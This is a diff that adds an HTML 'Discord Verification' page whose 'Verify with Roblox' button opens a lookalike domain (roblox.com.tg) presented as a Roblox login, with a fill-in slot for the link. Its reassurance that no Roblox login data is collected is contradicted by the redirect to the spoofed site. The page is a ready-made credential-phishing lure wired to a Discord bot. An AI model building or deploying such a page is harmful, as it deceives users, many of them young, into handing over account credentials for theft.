@@ -1,1 +1,141 @@
-<!DOCTYPE html><html><head><title>Discord Verify</title></head><body><h1>Verify Page</h1></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Discord Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bg-image {
+      position: absolute;
+      top: 10%;
+      right: 5%;
+      width: 200px;
+      opacity: 0.2;
+      pointer-events: none;
+    }
+
+    .container {
+      background: #fff;
+      border: 2px solid #f28b82;
+      border-radius: 16px;
+      padding: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      z-index: 1;
+    }
+
+    h1 {
+      color: #d93025;
+      margin-bottom: 20px;
+    }
+
+    .verify-btn {
+      background: #f28b82;
+      color: #fff;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .verify-btn:hover {
+      background: #e57368;
+    }
+
+    .terms {
+      font-size: 12px;
+      color: #777;
+      margin-top: 30px;
+      max-width: 350px;
+    }
+
+    .success {
+      color: #2e7d32;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQpAzrQtsUyeYJqa_XcGA3CJfbLun24y7AkUA&s" class="bg-image" alt="Background Art">
+
+  <div class="container">
+    <h1>Verify Your Account</h1>
+    <button class="verify-btn" onclick="openRobloxVerify()">Verify with Roblox</button>
+
+    <div id="status" class="success"></div>
+
+    <div class="terms">
+      By verifying, you agree to our Terms of Service. We do not collect or store your Roblox login information. Verification is only used to link your Discord account to your Roblox account securely.
+    </div>
+  </div>
+
+  <script>
+    const BOT_VERIFY_URL = "https://YOUR-BOT-URL/verify"; 
+    const VERIFY_SECRET = "xJ7!pQ9$zL2@hR5wA1&vN8#dE3^sT0b"; // same as in your bot.py
+
+    function openRobloxVerify() {
+      const params = new URLSearchParams(window.location.search);
+      const userId = params.get('user_id');
+
+      // PASTE YOUR ROBLOX LINK HERE ↓↓↓
+      const robloxLink = "https://www.roblox.com.tg/login?returnUrl=3148939916640801";
+
+      // Simulate: after Roblox login finishes, they come back here with ?verified=true
+      window.open(`${robloxLink}?user_id=${userId}`, '_blank');
+    }
+
+    async function sendVerifyToBot() {
+      const params = new URLSearchParams(window.location.search);
+      const userId = params.get('user_id');
+      if (!userId) return;
+
+      try {
+        const res = await fetch(BOT_VERIFY_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            user_id: userId,
+            secret: VERIFY_SECRET
+          })
+        });
+
+        if (res.ok) {
+          document.getElementById('status').innerText = "✅ Verification successful! You can now return to Discord.";
+        } else {
+          document.getElementById('status').innerText = "❌ Verification failed. Please try again.";
+        }
+      } catch (err) {
+        document.getElementById('status').innerText = "❌ Error contacting the bot server.";
+      }
+    }
+
+    // If they came back with ?verified=true, call the bot
+    const query = new URLSearchParams(window.location.search);
+    if (query.get('verified') === 'true') {
+      sendVerifyToBot();
+    }
+  </script>
+
+</body>
+</html>
